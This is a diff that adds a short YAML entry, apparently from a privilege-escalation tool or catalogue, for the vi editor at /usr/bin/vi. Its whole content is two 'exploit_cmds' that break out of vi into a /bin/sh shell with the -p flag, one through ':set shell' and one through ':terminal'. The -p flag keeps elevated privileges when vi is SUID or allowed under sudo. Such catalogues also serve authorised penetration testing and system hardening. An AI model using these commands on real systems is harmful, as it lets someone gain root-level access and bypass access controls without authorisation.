@@ -1,0 +1,5 @@
+name: vi
+binary_path: /usr/bin/vi
+exploit_cmds:
+- /usr/bin/vi -c ':set shell=/bin/sh\ -p | shell'
+- /usr/bin/vi -c ':terminal /bin/sh -p'
